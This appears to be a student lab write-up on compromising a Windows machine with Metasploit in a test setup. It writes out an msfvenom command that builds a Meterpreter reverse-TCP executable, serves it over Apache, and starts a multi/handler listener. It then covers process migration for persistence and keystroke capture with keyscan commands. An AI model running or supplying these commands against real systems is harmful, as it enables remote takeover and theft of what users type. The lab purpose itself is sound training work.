# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
OUTPUT:
![image](https://github.com/user-attachments/assets/95aa0e26-a6f5-43af-97c5-6b6646479fd2)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

OUTPUT:
![image](https://github.com/user-attachments/assets/3928166a-becd-449a-b230-3cffaff8490f)
copy the fun.exe into the apache /var/www/html folder 
![image](https://github.com/user-attachments/assets/27d7346c-538b-472e-96f5-d1921ff62019)
Start apache server sudo systemctl apache2 start
![image](https://github.com/user-attachments/assets/0a0a3173-0b02-40d7-9117-49748f953d8d)

Check the status of apache2 
![image](https://github.com/user-attachments/assets/329c0399-94d9-4896-9129-bb78a8426b2e)
Invoke msfconsole:

OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/user-attachments/assets/ce5096ba-9a77-4906-8c4e-d2d51ff1c826)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: 
http://192.168.1.2/fun.exe
The file "fun.exe" downloads.
![image](https://github.com/user-attachments/assets/6fd5a5b6-1f9e-40aa-826d-16dd33fd3c16)
Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit
![image](https://github.com/user-attachments/assets/3a2e0b01-8eed-475c-ab9f-7bb7ed49b23e)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:
migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/user-attachments/assets/e18a3617-a760-4dd7-a551-4a0c798b4221)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/user-attachments/assets/308f6940-cc27-4c87-9f94-97f5a34bee66)
keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/user-attachments/assets/964d658f-5501-4818-a5e4-b7e7ee24e014)


## RESULT:

The Metasploit framework for reconnaissance is examined successfully
